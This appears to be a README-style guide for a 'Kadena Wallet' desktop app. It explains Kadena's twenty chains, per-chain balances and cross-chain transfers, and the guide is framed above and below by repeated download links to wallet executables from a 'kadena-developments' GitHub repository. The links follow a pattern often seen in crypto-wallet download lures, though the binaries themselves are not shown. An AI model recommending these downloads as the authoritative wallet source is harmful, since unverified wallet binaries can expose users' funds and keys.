![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Choosing a Chain in Kadena Wallet: Why Balances Differ</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Kadena is not one ledger with one queue of transactions. It is twenty chains running side by side, and an account name is separate state on each of them. That single design choice explains the most common confusion in this ecosystem: a wallet that shows nothing is usually a wallet looking at the wrong chain.

Choosing a chain is therefore a decision you make deliberately, not a setting you inherit.

## You'll see this if

- An exchange asks which chain to withdraw on, and you do not know what to answer.
- A balance you know exists is missing from the wallet in front of you.
- You are deciding whether to keep everything on one chain or spread it.
- A contract or a service told you a chain number and you are not sure where to enter it.

## The chain is a location, not an identity

Three things are easy to mix up, and separating them removes most of the confusion.

| Thing | What it is | Does it change per chain |
| --- | --- | --- |
| The network | One Kadena mainnet | No |
| The account name | A derived principal, such as a `k:` string | No, the same string exists on every chain |
| The balance | State recorded against that name on one chain | Yes, independently on all twenty |

So the address you give someone is the same everywhere, and the funds behind it are not. A transfer names a chain as well as a destination, and the chain decides where the money lands.

This is why "my address is right but the balance is zero" is usually a true statement about a different chain rather than a contradiction.

## Why twenty chains exist at all

Chainweb runs twenty chains in parallel, braided together so that each chain's proof of work also secures the others. The design buys throughput by parallelism: twenty chains producing blocks means twenty streams of transactions rather than one.

The cost is that every wallet, exchange and tool has to know which chain it is talking about. A single-chain asset hides that complexity; this one cannot.

Blocks arrive on each chain roughly every thirty seconds on average. That figure is per chain, which matters when you are waiting for a transfer that involves two of them.

## The three decisions that actually matter

Most of the time, only three situations require a choice.

**Receiving from an exchange.** The venue decides, not you. Its withdrawal screen names a chain, and your wallet has to be showing that chain to see the deposit arrive. This is the case that generates almost every support question.

**Holding a balance.** Any chain works. What matters is that you remember which one, because a note saying "chain 4" is worth more than a screenshot of a balance.

**Interacting with a contract or a service.** Whatever the service specifies. Contracts live on a chain, and an interaction aimed at the wrong one fails or does nothing.

Everything else is preference.

## How to receive a deposit without losing sight of it

1. **Ask the sender which chain it will use.** If they cannot say, treat the deposit as unverified rather than assumed.
2. **Set the wallet to that chain before the funds arrive.** Finding the balance afterwards is possible; it is simply easier beforehand.
3. **Try a trivial amount first** on any unfamiliar route, then confirm it on the chain you expect.
4. **Record the chain** beside the address in whatever notes you keep.
5. **Check the explorer** if the amount does not appear, listing the chains rather than refreshing the same screen.

Steps one and four are the ones people skip, and both are free.

## Spread or consolidate

| Approach | Advantage | Cost |
| --- | --- | --- |
| Everything on one chain | One place to look; simple notes | A single chain's congestion affects everything |
| Spread across several | Diversifies timing and load | More places to check, more chances to forget a balance |

For most holders, consolidation is the better default, because the main risk in self-custody is not chain congestion but your own memory of where things are. A single chain number written down beats five balances you have to hunt for.

Spreading makes sense if you transact often on more than one chain, or if a service you use requires a specific one.

## Moving between chains is a separate operation

Changing the selector in the wallet does not move funds. It changes what you are looking at.

Actually moving a balance is a cross-chain transfer, which is two operations: the source chain debits and produces a proof, and the destination chain credits when that proof is submitted. Software that submits one side of the pair and stops leaves the movement half recorded, and the remedy is completion rather than a second attempt.

That two-step structure is worth knowing before you need it, because the moment you need it you are usually impatient.

## If you picked the wrong chain

Nothing is lost, and no resend is required.

1. Switch the wallet to the other chain and look again.
2. If the wallet has no selector, use an explorer and check the address chain by chain.
3. If the funds are on chain 9 and you wanted them on chain 0, that is a cross-chain transfer, not a mistake to undo.
4. Record which chain they are on so the next attempt is simpler.

The only genuine error is sending a second transfer while the first is still visible somewhere else.

## A default worth adopting

Pick one chain for holding, and use it consistently. When a venue insists on a different chain for a withdrawal, receive there, then move the balance to your holding chain deliberately, once, with the hash kept until it completes.

That policy costs one habit and removes an entire category of "where did it go" questions.

## FAQ

**Does my address change per chain?**
No. The principal is the same string everywhere. What changes is the balance recorded against it.

**Can I hold KDA on several chains at once?**
Yes, and many holders do without meaning to. Each balance is separate and each has to be looked at on its own chain.

**Which chain do exchanges use?**
It varies by venue and can change. Take the answer from the withdrawal screen at the time of the withdrawal, not from an old note.

**Is one chain faster than another?**
All twenty target the same block interval on average, and load differs by chain. Neither difference is large enough to plan around for ordinary transfers.

**Does the chain number affect fees?**
Fees are paid per transaction on the chain where the transaction executes. Moving between chains means paying on both.

## Related reading

- Cross-chain transfers in Kadena Wallet: how the twenty chains connect
- Why your KDA balance shows zero, and where it really is
- How to send KDA from Kadena Wallet safely
- Exchange deposit not showing? The chain mismatch behind it

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Chainweb's Twenty Chains, Explained for Wallet Users](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/chainweb-twenty-chains-in-kadena-wallet.md)
- [Cross-Chain Transfers in Kadena Wallet: How the Twenty Chains Actually Connect](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/cross-chain-transfers-in-kadena-wallet.md)
- [Stuck Cross-Chain Transfer in Kadena Wallet: Finish It, Don't Resend](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-wallet-stuck-cross-chain-transfer.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
